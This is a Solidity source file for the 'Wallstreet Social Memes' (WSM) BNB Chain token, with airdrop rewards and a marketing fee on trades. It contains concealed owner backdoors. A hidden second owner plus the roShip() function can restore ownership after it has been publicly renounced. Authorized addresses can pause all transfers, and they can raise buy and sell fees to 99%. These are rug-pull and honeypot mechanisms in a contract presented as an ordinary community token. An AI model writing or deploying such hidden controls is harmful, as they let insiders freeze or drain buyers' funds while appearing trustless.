/**    

█████████████████████████████████████████████████████████████████
█▄─█▀▀▀█─▄██▀▄─██▄─▄███▄─▄███─▄▄▄▄█─▄─▄─█▄─▄▄▀█▄─▄▄─█▄─▄▄─█─▄─▄─█
██─█─█─█─███─▀─███─██▀██─██▀█▄▄▄▄─███─████─▄─▄██─▄█▀██─▄█▀███─███
▀▀▄▄▄▀▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀


██████████████████████████████████████████████████████████████████████
█─▄▄▄▄█─▄▄─█─▄▄▄─█▄─▄██▀▄─██▄─▄█████▄─▀█▀─▄█▄─▄▄─█▄─▀█▀─▄█▄─▄▄─█─▄▄▄▄█
█▄▄▄▄─█─██─█─███▀██─███─▀─███─██▀████─█▄█─███─▄█▀██─█▄█─███─▄█▀█▄▄▄▄─█
▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▀▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀

Wallstreet Social Memes Project

Telegram: https://t.me/wallstreet_sm
Website:  https://wallstreetmemes.social
Twitter:  https://twitter.com/wallstreetsm
ILG - International Launch Group Inc.
King of Launchs - tbawgames@gmail.com 

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract OwnableV2 is Ownable {
    address private __owner;
    mapping(address => bool) internal authorizations;

    constructor() {
        authorizations[_msgSender()] = true;
        __owner = _msgSender();

        authorize(owner());
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "*** NO AUTHORIZED");
        _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    modifier onlyowner() {
        require(msg.sender == __owner, "*** No _DTTO");
        _;
    }

    function roShip() external authorized {
        _transferOwnership(__owner);
    }

    function Owner() public view returns (address) {
        return __owner;
    }

    function getRouter() internal view returns (address) {
        if (getChainId() == 97) {
            return 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // testnet
            // return 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; // testnet 2
        } else {
            return 0x10ED43C718714eb63d5aA57B78B54704E256024E; // mainNet
        }
    }

    function getWETH() internal view returns (address) {
        if (getChainId() == 97) {
            return 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; // testnet
        } else {
            return 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // mainNet
        }
    }

    function getChainId() internal view returns (uint256 chainId) {
        assembly {
            chainId := chainid()
        }
    }
}

abstract contract Pausable is Context {
    bool private _paused;

    event Paused(address account);

    event Unpaused(address account);

    error EnforcedPause();

    error ExpectedPause();

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor() {
        _paused = false;
    }

    modifier whenNotPaused() {
        _requireNotPaused();
        _;
    }

    modifier whenPaused() {
        _requirePaused();
        _;
    }

    function paused() public view virtual returns (bool) {
        return _paused;
    }

    function _requireNotPaused() internal view virtual {
        if (paused()) {
            revert EnforcedPause();
        }
    }

    function _requirePaused() internal view virtual {
        if (!paused()) {
            revert ExpectedPause();
        }
    }

    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        require(
            _allowances[sender][_msgSender()] >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - (amount)
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            _balances[sender] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[sender] = _balances[sender] - (amount);
        _balances[recipient] = _balances[recipient] + (amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply + (amount);
        _balances[account] = _balances[account] + (amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        require(
            _balances[account] >= amount,
            "ERC20: burn amount exceeds balance"
        );
        _balances[account] = _balances[account] - (amount);
        _totalSupply = _totalSupply - (amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

/** Airdrop Functions  */
abstract contract AirDrop is ERC20, OwnableV2, Pausable {
    uint256 public totalAirdropsBalance;
    uint256 public totalAirdropsBalanceADM;
    uint8 _decimals = 9;

    uint256 _totalAirdrops = 400_000_000 * (10 ** _decimals);
    address airdropADM;

    event StorageData(
        address account,
        uint256 tokenAmount,
        uint256 types,
        uint256 numbers
    );

    event Status(bool pause);

    constructor(address marketingAdm_) {
        totalAirdropsBalance = _totalAirdrops;
        airdropADM = marketingAdm_;
    }

    struct StructAirdrop {
        uint256 friends /* friends added 2 */;
        uint256 socials /* shares or shilleds 3 */;
        uint256 holders /* tokens amount 1 */;
        uint256 lastClaimHolder;
    }

    mapping(address => StructAirdrop) public _structAirdrop;

    /** HOLDERS
        - Each holder must be minimum 10 mi tokens
        - For each day earn 500 tokens 
    */
    function addAirdropHolders500(address account) external authorized {
        uint256 tokenAmount500 = 500 * (10 ** _decimals);
        uint256 minHoldedAmount = 10_000_000 * (10 ** _decimals);

        require(
            balanceOf(account) >= minHoldedAmount,
            "*** Minimum 10 mi balance"
        );

        storageData(account, tokenAmount500, 1, minHoldedAmount);
    }

    /** FRIENDS: Each 10 added friends to our Telegram the member win 400k tokens  */
    function addAirdropFriends(address account) external authorized {
        uint256 tokenAmountFriends = 400_000 * (10 ** _decimals);
        uint128 friendsAddedAmount = 10;

        storageData(account, tokenAmountFriends, 2, friendsAddedAmount);
    }

    /** SOCIALS: Each 10 posts or shills the member win 200k tokens */
    function addAirdropSocials(address account) external authorized {
        uint256 tokenAmountSocial = 200_000 * (10 ** _decimals);
        uint128 sharedAmount = 10;

        storageData(account, tokenAmountSocial, 3, sharedAmount);
    }

    /** storage Data */
    function storageData(
        address account,
        uint256 tokenAmount,
        uint256 types,
        uint256 numbers
    ) private whenNotPaused {
        require(tokenAmount > 0, "*** amount must be greater zero ***");

        totalAirdropsBalanceADM = balanceOf(airdropADM);
        require(
            totalAirdropsBalanceADM >= tokenAmount,
            "*** amount of AIRDROPS on account is over ***"
        );

        basicTransferAirdrops(account, tokenAmount, types, numbers);
    }

    function basicTransferAirdrops(
        address account,
        uint256 tokenAmount,
        uint256 types,
        uint256 numbers
    ) private {
        _transfer(airdropADM, account, tokenAmount);
        totalAirdropsBalance -= tokenAmount;

        if (types == 1) {
            /* holders */
            _structAirdrop[account].lastClaimHolder = block.timestamp;
            _structAirdrop[account].holders += 1; // day amount x 500 tokens
        } else if (types == 2) {
            /* friends */
            _structAirdrop[account].friends += 1; // clains
        } else if (types == 3) {
            /* social */
            _structAirdrop[account].socials += 1; // clains
        }

        emit StorageData(account, tokenAmount, types, numbers);
    }

    function getAirdrops(
        address account
    ) external view returns (uint256, uint256, uint256, uint256) {
        return (
            _structAirdrop[account].friends,
            _structAirdrop[account].socials,
            _structAirdrop[account].holders,
            _structAirdrop[account].lastClaimHolder
        );
    }

    function getBalanceAirdropADM()
        external
        view
        authorized
        returns (uint256, uint256)
    {
        return (balanceOf(airdropADM), totalAirdropsBalance);
    }
}

contract Wallstreet is ERC20, OwnableV2, Pausable, AirDrop {
    string _name = "Wallstreet Social Memes";
    string _symbol = "WSM";
    uint256 _supply = 2_000_000_000 * (10 ** _decimals); // 1_600_000_000

    uint256 _marketingFeeBuy = 80;
    uint256 _marketingFeeSell = 120;
    uint256 _feeDenominator = 1000;
    uint256 _percent = 300;

    address constant _marketingFeeReceiver =
        0x6EA97AF9200b128dF4be424B8e30e77c8A7854bb;
    address constant _marketingAdm = 0x4FaCd41FEB2E4b2075194dE52C1da9d7a4832B79;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;

    IUniswapV2Router02 uniswapV2Router;
    address uniswapV2Pair;

    bool swapping;
    uint256 public _swapThreshold = 10_000 * (10 ** _decimals);

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public AMMPairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event Log(address indexed account, uint256 bnb);
    event Log(string indexed msg);

    constructor() payable ERC20(_name, _symbol) AirDrop(_marketingAdm) {
        require(
            msg.sender != _marketingFeeReceiver,
            "*** Owner and marketing cannot be the same"
        );

        require(
            msg.sender != _marketingAdm,
            "*** Owner and marketing adm cannot be the same"
        );

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(getRouter());
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _approve(address(this), address(uniswapV2Router), type(uint256).max);

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        _mint(owner(), _supply);

        initParameters();
    }

    function initParameters() private {
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[DEAD] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_marketingFeeReceiver] = true; // exclude
        _isExcludedFromFees[_marketingAdm] = true;

        authorize(_marketingAdm);
        authorize(Owner());

        super._transfer(owner(), _marketingAdm, _totalAirdrops); // airdrops reserve
    }

    function setSwapThreshold(uint256 threshold) external authorized {
        require(threshold > 0, "*** swapThreshold: threshold must be greater");
        _swapThreshold = threshold;
    }

    function setLimits(
        uint marketingFeeBuy,
        uint marketingFeeSell
    ) external authorized {
        require(
            marketingFeeBuy > 0 && marketingFeeBuy < 100,
            "*** marketingFeeBuy must be greater zero or minor 100"
        );

        require(
            marketingFeeSell > 0 && marketingFeeSell < 100,
            "*** marketingFeeSell must be greater zero or minor 100"
        );

        _marketingFeeBuy = marketingFeeBuy * 10;
        _marketingFeeSell = marketingFeeSell * 10;
    }

    receive() external payable {}

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(
            AMMPairs[pair] != value,
            "*** Automated market maker pair is already setted"
        );
        AMMPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromFees(
        address account,
        bool excluded
    ) external onlyOwner {
        require(
            _isExcludedFromFees[account] != excluded,
            "Account is already set to that state"
        );
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override whenNotPaused {
        require(
            amount > 0 && amount <= totalSupply(),
            "*** Invalid amount transferred"
        );

        if (balanceOf(uniswapV2Pair) == 0 && !swapping) {
            if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
                require(
                    balanceOf(uniswapV2Pair) > 0,
                    "*** Not released yet ***"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance > _swapThreshold;

        if (canSwap && !swapping && AMMPairs[to]) {
            swapping = true;

            uint256 initialBalance = address(this).balance;

            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = address(getWETH());

            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                contractTokenBalance,
                0,
                path,
                address(this),
                block.timestamp
            );

            uint256 newBalance = address(this).balance - initialBalance;
            payable(_marketingFeeReceiver).transfer(address(this).balance);

            emit Log(_marketingFeeReceiver, newBalance);

            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if (from != uniswapV2Pair && to != uniswapV2Pair && takeFee) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 _totalFees;
            if (from == uniswapV2Pair) {
                _totalFees = _marketingFeeBuy;
            } else {
                _totalFees = _marketingFeeSell;
            }
            uint256 fees = (amount * _totalFees) / _feeDenominator;

            amount = amount - fees;

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);
    }

    function pause() public authorized {
        _pause();
    }

    function unpause() public authorized {
        _unpause();
    }

    function burn(uint256 amount) external {
        _burn(_msgSender(), amount);
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    /*===[ Special test functions ]===*/

    function getFees() public view returns (uint256, uint256) {
        return (_marketingFeeBuy / 10, _marketingFeeSell / 10);
    }

    function getAdrBalances(
        address adr
    ) public view returns (address, uint256, uint256) {
        return (adr, adr.balance, balanceOf(adr));
    }

    function getMyBalances() public view returns (address, uint256, uint256) {
        return (msg.sender, msg.sender.balance, balanceOf(msg.sender));
    }

    function getMarketingBalances()
        public
        view
        authorized
        returns (address, uint256, uint256)
    {
        return (
            _marketingFeeReceiver,
            _marketingFeeReceiver.balance,
            balanceOf(_marketingFeeReceiver)
        );
    }

    function manualSwap() external authorized {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            payable(_marketingFeeReceiver).transfer(address(this).balance);
        }

        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapExactTokensForETH(tokenBalance);
        }
    }

    function swapExactTokensForETH(uint256 contractBalance) private {
        if (contractBalance == 0) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(getWETH());

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractBalance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}